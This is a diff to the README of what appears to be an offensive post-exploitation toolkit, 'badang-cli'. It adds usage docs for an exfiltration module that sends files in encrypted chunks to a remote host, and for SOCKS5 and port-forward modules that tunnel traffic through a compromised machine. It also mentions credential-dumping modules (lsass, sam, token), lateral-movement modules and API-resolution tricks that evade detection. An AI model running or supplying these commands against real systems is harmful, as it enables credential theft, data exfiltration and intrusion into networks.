@@ -478,6 +478,32 @@ badang-cli postex --module winrm --remote 10.0.0.5 --postex-cmd "hostname" -x -c
 
 Six modules: `lsass`, `sam`, `token` (credentials) and `psexec`, `wmi`, `winrm` (lateral). All use dynamic API resolution — no static imports.
 
+### Data Exfiltration
+
+```bash
+# Staged file transfer over TCP with 64KB chunks
+badang-cli postex --module exfil --file data.zip --remote-host 10.0.0.1 --remote-port 8443 -x -c
+
+# With RC4 encryption
+badang-cli postex --module exfil --file data.zip --remote-host 10.0.0.1 --remote-port 8443 --exfil-key s3cret -x -c
+```
+
+Files are read in 64KB chunks, optionally RC4-encrypted, and sent with a 12-byte header per chunk (chunk ID, total chunks, chunk size). Uses raw socket API resolved from ws2_32 at runtime.
+
+### Network Tunneling
+
+```bash
+# SOCKS5 proxy — route traffic through the compromised host
+badang-cli postex --module socks --listen-port 1080 -x -c
+
+# Port forward — relay a local port to a remote host
+badang-cli postex --module portfwd --listen-port 8080 --remote-host 10.0.0.5 --remote-port 3389 -x -c
+```
+
+SOCKS5 supports no-auth handshake with IPv4 and domain connect requests. Port forwarding connects directly to the configured remote endpoint. Both use non-blocking I/O with `select()` for bidirectional data relay.
+
+Nine modules total: `lsass`, `sam`, `token` (credentials), `psexec`, `wmi`, `winrm` (lateral), `exfil` (exfiltration), `socks`, `portfwd` (tunneling).
+
 ---
 
 ## GUI Workflow
